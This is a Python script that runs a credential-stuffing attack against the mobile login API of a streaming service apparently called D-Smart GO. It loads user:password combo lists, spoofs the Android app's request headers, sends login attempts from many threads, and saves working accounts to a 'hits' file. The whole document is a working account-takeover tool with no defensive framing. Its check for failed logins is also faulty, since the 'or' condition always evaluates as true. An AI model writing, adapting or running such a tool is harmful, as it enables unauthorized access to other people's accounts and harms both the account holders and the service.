import requests
import threading
import time
import sys
import hashlib
import urllib.parse
import string
import random
def combo():

        combos = open(sys.argv[1], encoding='utf8', errors = 'ignore').readlines()
        User = []
        Pass = []
        for y in combos:
            ez = y.replace("\n", "").split(":")
            try:
                User.append(ez[0])
                Pass.append(ez[1])
            except:
                pass
        return User,Pass






def crack(User1,Pass1):
    data1 = {
      "RememberMe": "true",
      "mobile": f"{User1}",
      "password": f"{Pass1}"
    }
    headers1 = {
        "Host": "api-crm-v21.ercdn.com",
        "origin": "dsmartgo.phone.android",
        "content-type": "application/x-www-form-urlencoded",
        "content-lenght": "49",
        "accept-encoding": "gzip",
        "user-agent": "okhttp/3.12.0"
    }
    r1 = requests.post("https://api-crm-v21.ercdn.com/membership/login/Mobile?key=82c84a6b940a59e44705a8b9097036f5", data=data1, headers=headers1)
    if 'Incorrect login data' or 'Wrong mobile or password' in r1.text:
        print(f"BAD Hesap | {User1}:{Pass1}")
    if 'true' in r1.text: #success

                
        try:   
                
                print(f"Çalışan Hesap | {User1}:{Pass1} ")
                yazdir = open("HitDsmart.txt", "a+")
                yazdir.write(f"Work Acc -->{User1}:{Pass1}\n")
        except Exception as e:
            print("Exception oluştu "+ str(e) )




def başlatıcı():
    num=int('0')
    User,Pass=combo()
    threadsnum = sys.argv[2]
    while 1:
        if threading.active_count() < int(threadsnum):
                if len(User) > num:
                    threading.Thread(target=crack, args=(User[num], Pass[num])).start()
                    num += 1
                else:
                    
                    exit()
                    time.sleep(0.6)
                    
        else:
            #print("Checking done!")
            time.sleep(0.3)
başlatıcı()